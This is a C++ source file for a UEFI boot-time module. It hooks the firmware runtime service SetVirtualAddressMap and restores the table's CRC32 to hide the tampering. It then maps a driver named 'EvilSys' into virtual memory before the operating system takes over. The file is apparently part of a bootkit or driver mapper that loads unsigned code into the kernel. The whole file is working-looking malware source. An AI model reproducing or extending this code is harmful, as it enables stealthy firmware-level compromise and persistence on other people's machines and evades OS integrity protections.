#include "SetVirtualAddressMap.hpp"
#include "SetServicePointer.hpp"
#include "Mapper.hpp"

UINT32 BackupCRC32 = 0;
EFI_SET_VIRTUAL_ADDRESS_MAP orig_SetVirtualAddressMap;

EFI_STATUS
EFIAPI hk_SetVirtualAddressMap(
  IN  UINTN                        MemoryMapSize,
  IN  UINTN                        DescriptorSize,
  IN  UINT32                       DescriptorVersion,
  IN  EFI_MEMORY_DESCRIPTOR        *VirtualMap
  )
{
  Boot::SetServicePointer(&gRT->Hdr,(void**)&gRT->SetVirtualAddressMap,(void*)orig_SetVirtualAddressMap); //unhook
  gRT->Hdr.CRC32 = BackupCRC32; //restoring CRC32 hash

  auto PhysicalAddr = (UINT64)Mapper::LoadEvilSys();

  auto Size = MemoryMapSize / DescriptorSize;
  auto Map = VirtualMap;
  for(UINTN i = 0; i < Size; i++){
    auto Len = Map->NumberOfPages * 0x1000;
    auto Ptr = Map->PhysicalStart;
    if((Ptr <= PhysicalAddr) && (PhysicalAddr < (Ptr + Len))){
      PhysicalAddr = PhysicalAddr - Ptr + Map->VirtualStart; //convert to virtual address
      Mapper::LoadEvilSys() = (void*)PhysicalAddr; //loading virtual address to him
      break;
    }
    Map = (EFI_MEMORY_DESCRIPTOR*)((UINT64)Map + DescriptorSize);
  }

  return gRT->SetVirtualAddressMap(MemoryMapSize,DescriptorSize,DescriptorVersion,VirtualMap);
}

void Boot::HookSetVirtualAddressMap()
{
  Print((CHAR16*)L"Hooking SetVirtualAddressMap...\n");
  BackupCRC32 = gRT->Hdr.CRC32;
  orig_SetVirtualAddressMap = (EFI_SET_VIRTUAL_ADDRESS_MAP)SetServicePointer(&gRT->Hdr,
                                                    (void**)&gRT->SetVirtualAddressMap,
                                                    (void*)&hk_SetVirtualAddressMap);
}
